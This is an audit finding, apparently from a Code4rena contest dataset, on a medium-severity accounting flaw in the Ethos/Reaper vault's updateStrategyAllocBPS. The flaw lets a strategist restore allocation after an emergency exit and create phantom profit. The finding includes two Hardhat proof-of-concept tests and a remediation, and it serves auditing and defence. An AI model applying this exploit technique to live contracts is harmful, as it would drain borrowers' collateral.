# [M] `updateStrategyAllocBPS`

## Summary
Severity: Medium
Contest weight: 0.3414
Dataset id: 18120
Source: https://huggingface.co/datasets/Zaevlad/audit-findings-dataset
Type: audit-finding

## Details
The vulnerability originates from the function that updates a strategy’s allocation basis points (allocBPS) being callable even after the vault has entered an emergency exit state. When a guardian triggers setEmergencyExit, the vault revokes the strategy and forces its allocBPS to zero so that the strategy must unwind its positions and return all assets on the next harvest. The contract, however, does not prevent a strategist from calling updateStrategyAllocBPS and restoring the allocation to its previous value before the unwind is completed. Because the profit‑and‑loss accounting in the ActivePool relies on the current allocBPS to compute the strategy’s debt, resetting allocBPS after the emergency flag causes the debt value to be artificially reduced. This reduction inflates the vault’s share price, making the ActivePool’s recorded asset balance larger than the real collateral held. As a result, the ActivePool’s internal rebalance routine believes a profit has been generated and distributes this phantom profit to the Treasury, StabilityPool and StakingPool. From a user’s perspective the balance of their deposit appears to increase and they can withdraw the extra amount, while borrowers later receive less collateral than they originally supplied. The issue is triggered only after an emergency exit has been declared and before the strategy’s harvest completes, and it can be exploited by any account with permission to modify allocBPS (typically the strategist). It was uncovered during a Code4rena audit through targeted unit tests that demonstrated an inflated asset value and subsequent profit distribution. The bug is subtle because the vault’s share price simply rises, which looks like legitimate earnings, and no explicit error is emitted. The flaw belongs to the class of accounting‑state‑inconsistency bugs where mutable configuration parameters are changed after a critical state transition, breaking the invariant that profit calculations must be based on a fixed allocation during emergency mode. The recommended remediation is to make allocBPS immutable once emergency exit is active, for example by moving the emergency flag into the vault’s strategy parameters and adding a guard in updateStrategyAllocBPS that rejects any change when the flag is set, thereby preserving correct debt accounting and preventing phantom profit creation.

## Proof of Concept
Add the following test case to `Ethos-Vault/test/start-test.js`. This shows that ActivePool’s asset value will be inflated due to the issue. The next test case will show that inflated asset value will cause ActivePool’s `_rebalance()` to record a profit and distribute them to the respective pools, that can be withdrawn.

    it.only('updateStrategyAllocBPS can cause loss of ActivePool collateral during emergency exit', async function () {
      const {vault, strategy, want, wantHolder, strategyAddress, strategist, guardian} = 
        await loadFixture(deployVaultAndStrategyAndGetSigners);
      // intialize guardian account with ETH for gas
      const tx = await strategist.sendTransaction({
        to: guardianAddress,
        value: ethers.utils.parseEther('0.1'),
      });
      await tx.wait();

      // Treasury owned asset value starts with zero
      const treasurySharesBefore = await vault.balanceOf(treasuryAddr);
      const treasuryAssetsBefore = await vault.convertToAssets(treasurySharesBefore);
      expect(treasuryAssetsBefore).to.equal(0);

      // ActivePool deposits 10 WBTC 
      await vault.connect(wantHolder)['deposit(uint256)'](toWantUnit('10'));
      await strategy.harvest();
     
      // Expect ActivePool's owned share and asset to be equal to 10 WBTC as deposited
      const activePoolSharesBefore = await vault.balanceOf(wantHolder.address);
      const activePoolAssetsBefore = await vault.convertToAssets(activePoolSharesBefore);
      expect(activePoolSharesBefore).to.equal(toWantUnit('10'));
      expect(activePoolAssetsBefore).to.equal(toWantUnit('10'));

      /* Guardian calls setEmergencyExit().
      *  This triggers Vault to revokeStrategy() and set strategy's allocBPS to 0.
      *  By design, this will force strategy to exit all its position and 
      *  return funds to vault in the next harvest().
      */
      await strategy.connect(guardian).setEmergencyExit();

      /* Strategist set AllocBPS back to 10000 (100%). 
      *  This will reverse the revokeStrategy() and cause strategy's debt value 
      *  to be reduced in next harvest()
      */
      await vault.connect(strategist).updateStrategyAllocBPS(strategy.address, 10000);

      /* Strategy will liquidate all its position due to emergency exit state.
      * However, it will also record an incorrect profit due to reduced debt value.
      */
      await strategy.harvest();

      // Jump ahead for incorrect profit to unlock
      await moveTimeForward(3600*7);

      // Treasury will gain fees of 1.56 WBTC on the incorrect profit value
      const treasurySharesAfter = await vault.balanceOf(treasuryAddr);
      const treasuryAssetsAfter = await vault.convertToAssets(treasurySharesAfter);
      expect(treasuryAssetsAfter).to.not.equal(treasuryAssetsBefore);
      expect(treasuryAssetsAfter).to.equal(156880733);

      // ActivePool's owned asset value is incorrectly inflated 
      // This is due to increased share price from the incorrect profit and wrong accounting from allocBPS
      const activePoolSharesAfter = await vault.balanceOf(wantHolder.address);
      const activePoolAssetsAfter = await vault.convertToAssets(activePoolSharesAfter);
      expect(activePoolAssetsAfter).to.equal("1743119266");
      expect(activePoolAssetsAfter).to.not.equal(activePoolAssetsBefore);

      /* ActivePool will record a profit of 7.43 WBTC (74% of initial deposit) due to the inflated asset value
      *  In the next ActivePool's _rebalance(), the  incorrect profit will be distributed to Treasury, 
      *  Staking Pool and StabilityPool. 
      *  Depositors and Stakers will be able to withdraw the profits, leading to loss of borrowers's collateral.
      */
      const estimatedActivePoolProfit = activePoolAssetsAfter - activePoolAssetsBefore;
      expect(estimatedActivePoolProfit).to.be.equal(743119266);

    });

Add the following test case to `Ethos-Core/test/PoolsTest.js`. Note that this is an test independent from the previous test case just to show that ActivePool will record a profit when the share asset value increases, and the profit will be distributed to the respective pools.

    it.only('simulate incorrect profit to show that _rebalance() called by sendCollateral() will distributes profit', async () => {
    	await setReasonableDefaultStateForYielding();

    	// Simulate incorrect profit: mint 1 ether to vault.  
    	// This will increase the vault share price and inflate the ActivePool's owned asset value.
    	await collaterals[0].mint(vaults[0].address, dec(1, 'ether'))

    	// Trigger ActivePool's _rebalance() via sendCollateral(). 
    	// ActivePool will record a profit due to the inflated owned asset value.
    	const sendCollData = th.getTransactionData('sendCollateral(address,address,uint256)', 
    	  [collaterals[0].address, alice, web3.utils.toHex(dec(1, 'ether'))])
    	await mockBorrowerOperations.forward(activePool.address, sendCollData, { from: owner })

    	// The incorrect profit will be distributed to Treasury, StabilityPool and Staking Pool
    	assert.equal((await collaterals[0].balanceOf(treasury.address)).toString(), '200000000000000000') // 0.2 ether
    	assert.equal((await collaterals[0].balanceOf(stabilityPool.address)).toString(), '300000000000000000') // 0.3 ether
    	assert.equal((await collaterals[0].balanceOf(lqtyStaking.address)).toString(), '500000000000000000') // 0.5 ether
    })

## Recommendation
The fix is to block all changes to strategy’s `allocBPS` after `setEmergencyExit()`.

Since `allocBPS` is already tracked within `ReaperVaultV2.sol`, it is better to refactor and shift `emergencyExit` from `ReaperBaseStrategyv4.sol` to `ReaperVaultV2.StrategyParams`. With that, the fix can simply just to add a check for emergency exit within `updateStrategyAllocBPS()`.
